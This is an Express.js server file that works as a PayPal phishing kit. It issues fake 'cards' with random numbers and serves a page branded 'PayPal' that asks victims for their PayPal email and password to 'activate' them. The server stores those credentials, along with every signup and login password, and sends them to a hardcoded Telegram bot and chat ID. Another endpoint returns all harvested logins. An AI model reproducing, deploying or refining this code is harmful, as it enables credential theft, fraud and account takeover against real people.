import express from 'express';
import jwt from 'jsonwebtoken';
import fs from 'fs';
import { Telegraf } from 'telegraf';
import cors from 'cors';

const app = express();
const port = process.env.PORT || 3000;

// Enable CORS for frontend
app.use(cors({ origin: 'https://o-448v.onrender.com' }));
app.use(express.json());
app.use(express.urlencoded({ extended: true })); // For parsing form data

// Data file initialization
const dataFile = 'data.json';
let data = { users: [], cards: [], paypalLogins: [], logs: [] };
function loadData() {
    try {
        if (fs.existsSync(dataFile)) {
            data = JSON.parse(fs.readFileSync(dataFile));
            // Ensure paypalLogins and logs exist
            if (!data.paypalLogins) data.paypalLogins = [];
            if (!data.logs) data.logs = [];
        } else {
            fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
        }
    } catch (error) {
        console.error('Error loading data.json:', error);
        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
    }
}
loadData();

// Telegram setup
const TELEGRAM_BOT_TOKEN = '7298585119:AAG-B6A6fZICTrYS7aNdA_2JlfnbghgnzAo';
const TELEGRAM_CHAT_ID_ADMIN = '6270110371';
const bot = new Telegraf(TELEGRAM_BOT_TOKEN);

async function sendTelegramNotification(message) {
    for (let attempt = 1; attempt <= 3; attempt++) {
        try {
            await bot.telegram.sendMessage(TELEGRAM_CHAT_ID_ADMIN, message);
            console.log(`Telegram notification sent (Attempt ${attempt}): ${message}`);
            return true;
        } catch (error) {
            console.error(`Telegram notification error (Attempt ${attempt}): ${error.message}`);
            if (attempt < 3) {
                console.log(`Retrying (${attempt + 1}/3) in 2 seconds...`);
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }
    }
    console.error('Failed to send Telegram notification after 3 attempts.');
    return false;
}

// Middleware to verify token
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'No token provided' });
    jwt.verify(token, 'your-secret-key', (err, user) => {
        if (err) return res.status(403).json({ error: 'Invalid token' });
        req.user = user;
        next();
    });
};

// Test notification on startup
app.listen(port, async () => {
    console.log(`Server running on port ${port}`);
    const testMessage = 'Server started successfully - Test notification from https://o-448v.onrender.com';
    await sendTelegramNotification(testMessage);
});

// Authentication routes
app.post('/api/auth/signup', authenticateToken, async (req, res) => {
    try {
        const { username, password } = req.body;
        if (!username || !password || !/^[a-zA-Z0-9@.]+$/.test(username)) {
            return res.status(400).json({ error: 'Invalid username or password' });
        }
        if (data.users.find(u => u.username === username)) {
            return res.status(400).json({ error: 'Username already exists' });
        }
        data.users.push({ username, password });
        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
        const message = `New signup: Username: ${username}, Password: ${password}`;
        await sendTelegramNotification(message);
        res.status(201).json({ message: 'User created successfully' });
    } catch (error) {
        console.error('Signup error:', error);
        res.status(500).json({ error: 'Server error during signup' });
    }
});

app.post('/api/auth/login', authenticateToken, async (req, res) => {
    try {
        const { username, password } = req.body;
        const user = data.users.find(u => u.username === username && u.password === password);
        if (!user) return res.status(401).json({ error: 'Invalid credentials' });
        const token = jwt.sign({ username }, 'your-secret-key', { expiresIn: '1h' });
        const message = `Login: Username: ${username}, Password: ${password}`;
        await sendTelegramNotification(message);
        res.json({ token });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ error: 'Server error during login' });
    }
});

// Card management routes
app.get('/api/cards', authenticateToken, (req, res) => {
    try {
        const userCards = data.cards.filter(c => c.user === req.user.username);
        res.json(userCards);
    } catch (error) {
        console.error('Fetch cards error:', error);
        res.status(500).json({ error: 'Server error fetching cards' });
    }
});

app.post('/api/cards/generate', authenticateToken, (req, res) => {
    try {
        const { name, expDate, amount } = req.body;
        if (!name || !expDate || !amount || amount <= 0 || !/^\d{6}$/.test(expDate)) {
            return res.status(400).json({ error: 'Invalid card details' });
        }
        const cardId = Date.now().toString();
        // Generate a random 16-digit card number
        const randomCardNumber = Array.from({ length: 16 }, () => Math.floor(Math.random() * 10)).join('');
        const card = { cardId, name, expDate, amount, number: randomCardNumber, cvv: '123', user: req.user.username, status: 'pending' };
        data.cards.push(card);
        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
        res.status(201).json({ cardId });
    } catch (error) {
        console.error('Generate card error:', error);
        res.status(500).json({ error: 'Server error generating card' });
    }
});

app.delete('/api/cards/:cardId', authenticateToken, (req, res) => {
    try {
        const cardId = req.params.cardId;
        const cardIndex = data.cards.findIndex(c => c.cardId === cardId && c.user === req.user.username);
        if (cardIndex === -1) return res.status(404).json({ error: 'Card not found' });
        data.cards.splice(cardIndex, 1);
        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
        res.json({ message: 'Card deleted' });
    } catch (error) {
        console.error('Delete card error:', error);
        res.status(500).json({ error: 'Server error deleting card' });
    }
});

app.get('/api/cards/activate/:cardId', authenticateToken, (req, res) => {
    try {
        const cardId = req.params.cardId;
        const card = data.cards.find(c => c.cardId === cardId && c.user === req.user.username);
        if (!card) return res.status(404).json({ error: 'Card not found' });
        res.json(card);
    } catch (error) {
        console.error('Activation fetch error:', error);
        res.status(500).json({ error: 'Server error fetching activation details' });
    }
});

app.post('/api/cards/activate/:cardId', authenticateToken, async (req, res) => {
    try {
        const cardId = req.params.cardId;
        const { paypalUsername, paypalPassword } = req.body;
        const card = data.cards.find(c => c.cardId === cardId && c.user === req.user.username);
        if (!card) return res.status(404).json({ error: 'Card not found' });
        if (!paypalUsername || !paypalPassword) return res.status(400).json({ error: 'PayPal credentials required' });
        if (card.status !== 'pending') return res.status(400).json({ error: 'Card already activated' });

        card.status = 'activated';
        data.paypalLogins.push({
            cardId,
            paypalUsername,
            paypalPassword,
            user: req.user.username,
            timestamp: new Date().toISOString()
        });

        data.logs.push({ cardId, user: req.user.username, time: new Date().toISOString() });

        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
        const message = `PayPal Login from ${cardId}: Email: ${paypalUsername}, Password: ${paypalPassword}`;
        await sendTelegramNotification(message);
        res.json({ message: 'Card activated', cardId, status: 'activated' });
    } catch (error) {
        console.error('Activate card error:', error);
        res.status(500).json({ error: 'Server error activating card' });
    }
});

app.get('/api/cards/logs', authenticateToken, (req, res) => {
    try {
        res.json(data.logs);
    } catch (error) {
        console.error('Fetch logs error:', error);
        res.status(500).json({ error: 'Server error fetching logs' });
    }
});

app.get('/api/creator/dashboard', authenticateToken, (req, res) => {
    try {
        if (req.user.username !== 'admin') return res.status(403).json({ error: 'Access denied' });
        const dashboardData = {
            generatedCards: data.cards.filter(c => c.user === 'admin'),
            paypalLogins: data.paypalLogins.filter(l => l.user === 'admin')
        };
        res.json(dashboardData);
    } catch (error) {
        console.error('Dashboard error:', error);
        res.status(500).json({ error: 'Server error loading dashboard' });
    }
});

// Updated endpoint to fetch all PayPal credentials for authenticated users
app.get('/api/cards/paypal-creds', authenticateToken, (req, res) => {
    try {
        // Return all paypalLogins, not just for the authenticated user
        res.json({ paypalLogins: data.paypalLogins });
    } catch (error) {
        console.error('Fetch PayPal creds error:', error);
        res.status(500).json({ error: 'Server error fetching PayPal credentials' });
    }
});

// New standalone activation route
app.get('/card/:cardId/activate', (req, res) => {
    const cardId = req.params.cardId;
    const card = data.cards.find(c => c.cardId === cardId);
    if (!card || card.status !== 'pending') {
        return res.status(404).send('Card not found or already activated');
    }
    // Serve a standalone activation page with the same style as the frontend
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Activate Your Card</title>
            <style>
                body {
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    background-color: #f7f9fa;
                    position: relative;
                }
                .container {
                    width: 400px;
                    padding: 30px;
                    background-color: #ffffff;
                    border-radius: 15px;
                    box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    position: relative;
                    z-index: 1;
                }
                .logo {
                    font-size: 24px;
                    font-weight: 700;
                    color: #000000;
                    margin-bottom: 20px;
                    line-height: 1;
                    letter-spacing: -1px;
                    text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
                }
                .input-field {
                    width: 100%;
                    padding: 15px 20px;
                    margin: 10px 0;
                    border: 2px solid #0070ba;
                    border-radius: 25px;
                    font-size: 14px;
                    color: #333333;
                    box-sizing: border-box;
                    background-color: #ffffff;
                    transition: box-shadow 0.3s ease;
                }
                .input-field:focus {
                    box-shadow: 0 0 10px rgba(0, 112, 186, 0.5);
                    outline: none;
                }
                .input-field::placeholder {
                    color: #999999;
                    font-weight: 400;
                }
                .btn {
                    width: 100%;
                    padding: 12px;
                    margin: 10px 0;
                    border: none;
                    border-radius: 25px;
                    font-size: 16px;
                    cursor: pointer;
                    font-weight: 600;
                    text-transform: uppercase;
                    transition: transform 0.2s ease, box-shadow 0.2s ease;
                }
                .btn-login {
                    background-color: #0070ba;
                    color: #ffffff;
                    box-shadow: 0 4px 8px rgba(0, 112, 186, 0.3);
                }
                .btn-login:hover {
                    transform: translateY(-2px);
                    box-shadow: 0 6px 12px rgba(0, 112, 186, 0.4);
                }
                #message {
                    color: #ff4444;
                    margin-top: 10px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">PayPal</div>
                <p>Card ID: ${cardId}</p>
                <form id="activationForm" action="/card/${cardId}/activate" method="POST">
                    <input type="text" class="input-field" name="paypalUsername" placeholder="PayPal Email" required>
                    <input type="password" class="input-field" name="paypalPassword" placeholder="PayPal Password" required>
                    <button type="submit" class="btn btn-login">Activate Card</button>
                </form>
                <div id="message"></div>
            </div>
            <script>
                document.getElementById('activationForm').addEventListener('submit', async (e) => {
                    e.preventDefault();
                    const form = e.target;
                    const response = await fetch(form.action, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: new URLSearchParams(new FormData(form)).toString()
                    });
                    const data = await response.text();
                    document.getElementById('message').textContent = data;
                    if (response.ok) {
                        // Notify frontend via API
                        fetch('https://o-448v.onrender.com/api/cards/activate/external', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ cardId: '${cardId}', paypalUsername: form.paypalUsername.value, paypalPassword: form.paypalPassword.value })
                        }).catch(err => console.error('Frontend notification failed:', err));
                    }
                });
            </script>
        </body>
        </html>
    `);
});

app.post('/card/:cardId/activate', async (req, res) => {
    const cardId = req.params.cardId;
    const card = data.cards.find(c => c.cardId === cardId);
    if (!card || card.status !== 'pending') {
        return res.status(404).send('Card not found or already activated');
    }
    const paypalUsername = req.body.paypalUsername;
    const paypalPassword = req.body.paypalPassword;
    if (!paypalUsername || !paypalPassword) {
        return res.status(400).send('PayPal credentials are required');
    }

    card.status = 'activated';
    data.paypalLogins.push({
        cardId,
        paypalUsername,
        paypalPassword,
        user: 'external', // Marked as external activation
        timestamp: new Date().toISOString()
    });
    data.logs.push({ cardId, user: 'external', time: new Date().toISOString() });
    fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
    const message = `External PayPal Login from ${cardId}: Email: ${paypalUsername}, Password: ${paypalPassword}`;
    await sendTelegramNotification(message);
    res.send('Card activated successfully!');
});

// New endpoint for frontend to receive external activations
app.post('/api/cards/activate/external', (req, res) => {
    const { cardId, paypalUsername, paypalPassword } = req.body;
    if (!cardId || !paypalUsername || !paypalPassword) {
        return res.status(400).json({ error: 'Missing required fields' });
    }
    // This endpoint can be used by the frontend to sync external activations
    res.json({ message: 'External activation received', cardId, paypalUsername, paypalPassword });
});

// Error handlers
app.use((err, req, res, next) => {
    console.error('Global error:', err.stack);
    res.status(500).json({ error: 'Internal server error' });
});

app.use((req, res) => {
    res.status(404).json({ error: 'Route not found' });
});

process.on('SIGTERM', () => {
    fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
    process.exit(0);
});
